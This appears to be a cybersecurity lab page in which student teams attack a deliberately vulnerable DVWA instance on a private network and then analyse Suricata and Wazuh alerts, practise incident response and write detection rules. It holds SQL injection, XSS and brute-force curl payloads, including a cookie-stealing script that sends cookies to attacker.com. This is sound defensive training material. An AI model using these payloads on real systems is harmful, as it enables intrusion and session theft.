---
title: "Set 4: Generate Attack Scenarios and Analyze Response"
description: Coordinated attack simulation and security response analysis
layout: default
nav_order: 5
---

# 🎯 DVWA Set 4: Generate Attack Scenarios and Analyze Response

## 🎯 Objective
Execute realistic attack scenarios against DVWA to test the complete security monitoring pipeline and practice incident response procedures.

---

## 👥 Role Requirements
- **All roles participate:** Deploy teams generate attacks, Security teams analyze responses
- **AM Team (amdeploy/amsec)** work together on AM environment
- **PM Team (pmdeploy/pmsec)** work together on PM environment

---

## 📋 Attack Simulation Steps

### Phase 1: Baseline Traffic Generation

**Deploy Teams Create Normal Activity:**

**🔵 AM Team (amdeploy):**
```bash
# Generate normal user behavior
curl -s http://192.168.0.169:8080/
curl -s http://192.168.0.169:8080/login.php
curl -s http://192.168.0.169:8080/setup.php
```

**🟣 PM Team (pmdeploy):**
```bash
# Generate normal user behavior  
curl -s http://192.168.0.169:8081/
curl -s http://192.168.0.169:8081/login.php
curl -s http://192.168.0.169:8081/setup.php
```

**💡 Baseline Establishment:**
- Creates normal traffic patterns
- Establishes expected behavior
- Provides comparison for anomalies

**Security teams observe:**
- Normal HTTP response codes (200, 302)
- Typical request patterns
- Expected response times
- Clean log entries

### Phase 2: SQL Injection Attack Scenario

**Deploy Teams Execute SQL Injection:**

**🔵 AM Team:**
```bash
# Basic SQL injection attempts
curl "http://192.168.0.169:8080/vulnerabilities/sqli/?id=1'%20OR%20'1'='1'&Submit=Submit"

# Union-based injection
curl "http://192.168.0.169:8080/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%201,database()--&Submit=Submit"

# Information gathering
curl "http://192.168.0.169:8080/vulnerabilities/sqli/?id=1'%20UNION%20SELECT%201,version()--&Submit=Submit"
```

**🟣 PM Team:**
```bash
# Time-based blind injection
curl "http://192.168.0.169:8081/vulnerabilities/sqli/?id=1'%20AND%20SLEEP(5)--&Submit=Submit"

# Error-based injection
curl "http://192.168.0.169:8081/vulnerabilities/sqli/?id=1'%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--&Submit=Submit"
```

**💡 SQL Injection Types:**
- Boolean-based: OR '1'='1'
- Union-based: data extraction
- Time-based: blind injection
- Error-based: information disclosure

**💡 Expected Detections:**
- Suricata: SQL keywords in URL
- Wazuh: unusual request patterns
- Application: potential error responses
- Database: query anomalies

### Phase 3: Cross-Site Scripting (XSS) Attack Scenario

**Deploy Teams Execute XSS Attacks:**

**🔵 AM Team:**
```bash
# Reflected XSS
curl "http://192.168.0.169:8080/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>"

# Advanced payload
curl "http://192.168.0.169:8080/vulnerabilities/xss_r/?name=<img%20src=x%20onerror=alert('XSS')>"

# Cookie stealing simulation
curl "http://192.168.0.169:8080/vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
```

**🟣 PM Team:**
```bash
# Stored XSS simulation
curl -X POST "http://192.168.0.169:8081/vulnerabilities/xss_s/" \
  --data "txtName=<script>alert('Stored XSS')</script>&mtxMessage=Test&btnSign=Sign Guestbook"

# DOM-based XSS
curl "http://192.168.0.169:8081/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>"
```

**💡 XSS Attack Types:**
- Reflected: payload in URL parameters
- Stored: payload saved in application
- DOM-based: client-side execution
- Cookie theft: session hijacking

**💡 Detection Points:**
- Suricata: script tags in HTTP
- Wazuh: suspicious POST data
- Browser: JavaScript execution
- Network: outbound connections

### Phase 4: Brute Force Attack Scenario

**Deploy Teams Execute Login Attacks:**

**🔵 AM Team:**
```bash
# Rapid login attempts
for i in {1..10}; do
  curl -X POST "http://192.168.0.169:8080/login.php" \
    --data "username=admin&password=wrong$i" \
    --cookie-jar cookies.txt
  sleep 1
done

# Dictionary attack simulation
for pass in password 123456 admin root test; do
  curl -X POST "http://192.168.0.169:8080/login.php" \
    --data "username=admin&password=$pass"
done
```

**🟣 PM Team:**
```bash
# High-frequency attempts
for i in {1..15}; do
  curl -X POST "http://192.168.0.169:8081/login.php" \
    --data "username=user&password=fail$i" &
done
wait
```

**💡 Brute Force Patterns:**
- Multiple failed attempts
- High request frequency
- Dictionary passwords
- Distributed timing

**💡 Detection Thresholds:**
- Suricata: rapid request patterns
- Wazuh: failed login correlation
- Application: account lockouts
- Network: connection frequency

### Phase 5: Security Teams Monitor and Analyze

**AM Security (amsec) and PM Security (pmsec) Monitor Events:**

```bash
# Real-time log monitoring
tail -f /srv/logs/am/suricata/eve.json | jq 'select(.event_type=="alert")'

# Count attack types
jq 'select(.event_type=="alert") | .alert.signature' /srv/logs/am/suricata/eve.json | sort | uniq -c

# Analyze HTTP patterns
jq 'select(.event_type=="http" and .http.status>=400)' /srv/logs/am/suricata/eve.json

# Check Wazuh logs for correlations
tail -f /var/ossec/logs/alerts/alerts.log
```

**💡 Real-time Analysis:**
- Live event streaming
- Alert pattern recognition
- HTTP error analysis
- Cross-system correlation

**💡 Key Metrics:**
- Attack frequency
- Success/failure rates
- Response times
- Alert accuracy

### Phase 6: Dashboard Investigation

**Security Teams Access Wazuh Dashboard:**

1. **Navigate to Security Events:**
   - URL: `https://wazuh-indexer:443`
   - Time filter: Last 30 minutes
   - Search: `rule.level:>=7` (high severity)

2. **Analyze Attack Timeline:**
   - Group by: attack type
   - Filter by: source IP
   - Review: rule descriptions

3. **Investigate Specific Events:**
   - Click individual alerts
   - Review full event details
   - Check related events
   - Export for reporting

**💡 Dashboard Features:**
- Visual timeline analysis
- Event correlation graphs
- Geographical IP mapping
- Drill-down capabilities

**💡 Investigation Process:**
- Start with high-severity alerts
- Trace attack progression
- Identify patterns and IOCs
- Document findings

### Phase 7: Incident Response Simulation

**Security Teams Practice Response:**

```bash
# Block attacking IP (simulation)
echo "# Blocking IP 192.168.0.100" >> /tmp/blocked_ips.txt

# Gather evidence
jq 'select(.src_ip=="192.168.0.100")' /srv/logs/am/suricata/eve.json > /tmp/attack_evidence.json

# Create incident report
cat > /tmp/incident_report.txt << EOF
INCIDENT REPORT
===============
Time: $(date)
Attack Type: SQL Injection + XSS
Source IP: Multiple (192.168.0.x)
Target: DVWA Application
Severity: High
Status: Contained
EOF

# Document mitigation steps
echo "1. Identified attack patterns
2. Analyzed event timeline
3. Blocked malicious IPs
4. Updated detection rules
5. Notified stakeholders" >> /tmp/incident_report.txt
```

**💡 Incident Response Steps:**
1. Detection and alerting
2. Initial triage
3. Evidence collection
4. Containment actions
5. Documentation

**💡 Response Artifacts:**
- Event timelines
- Evidence preservation
- Mitigation actions
- Lessons learned
- Process improvements

### Phase 8: Custom Rule Creation

**Ask instructor to create custom detection rules:**

**Suricata Rule:**
```bash
# Advanced SQL injection detection
alert http any any -> any any (msg:"DVWA Advanced SQL Injection"; content:"UNION"; http_uri; content:"SELECT"; http_uri; distance:0; within:20; sid:1000010; rev:1;)
```

**Wazuh Rule:**
```xml
<rule id="100010" level="12">
  <if_sid>31108</if_sid>
  <field name="data.url">vulnerabilities/sqli</field>
  <regex>UNION|SELECT|INSERT|DELETE|DROP</regex>
  <description>SQL injection attack detected on DVWA</description>
  <group>attack,sql_injection,dvwa</group>
</rule>
```

**💡 Custom Detection:**
- Tailored to specific applications
- Reduced false positives
- Enhanced detection accuracy
- Business context integration

**💡 Rule Components:**
- Pattern matching
- Severity classification
- Alert grouping
- Threshold settings

---

## ✅ Success Criteria

- [ ] Multiple attack types successfully executed
- [ ] All attacks detected by monitoring systems
- [ ] Events visible in Wazuh Dashboard
- [ ] Suricata alerts generated appropriately
- [ ] Security teams documented incidents
- [ ] Response procedures practiced
- [ ] Custom rules created and tested

---

## 📊 Attack Scenario Summary

| Attack Type | Technique | Detection Method | Expected Alerts |
|-------------|-----------|------------------|-----------------|
| **SQL Injection** | Union, Boolean, Time-based | URL pattern matching | High severity (10-12) |
| **XSS** | Reflected, Stored, DOM | Script tag detection | Medium-High (8-10) |
| **Brute Force** | Dictionary, Rapid attempts | Request frequency | Medium (6-8) |
| **Reconnaissance** | Directory scanning, Info gathering | 404 patterns | Low-Medium (4-6) |

---

## 🔍 Key Performance Indicators

```bash
# Detection rate calculation
total_attacks=$(grep -c "attack" /tmp/attack_log.txt)
detected_attacks=$(jq 'select(.event_type=="alert")' /srv/logs/am/suricata/eve.json | wc -l)
detection_rate=$((detected_attacks * 100 / total_attacks))

# False positive analysis
legitimate_requests=50
total_alerts=$(jq 'select(.event_type=="alert")' /srv/logs/am/suricata/eve.json | wc -l)
false_positive_rate=$((total_alerts * 100 / legitimate_requests))
```

---

## ⚠️ Common Issues & Troubleshooting

| Problem | Cause | Solution |
|---------|-------|----------|
| No alerts generated | Rules not loaded | Check Suricata rule updates |
| High false positive rate | Generic detection rules | Create application-specific rules |
| Missing events in dashboard | Indexing delay | Wait 2-3 minutes for processing |
| Attacks not detected | Encoding/evasion | Update detection patterns |
| Dashboard login fails | Certificate issues | Accept security warnings |

---

## 📈 Next Steps

- **[Set 5: Advanced threat hunting and forensic analysis](set5-hunting)**
- **Integration:** SIEM platform connectivity
- **Automation:** Automated response and remediation
- **Reporting:** Executive dashboards and metrics

---

## 🎉 Excellent work!

You've successfully executed comprehensive attack scenarios and demonstrated the effectiveness of your security monitoring infrastructure.

---

**Navigation:**
- **[← Set 3: Suricata Configuration](set3-suricata)** | **[Set 5: Advanced Hunting →](set5-hunting)**
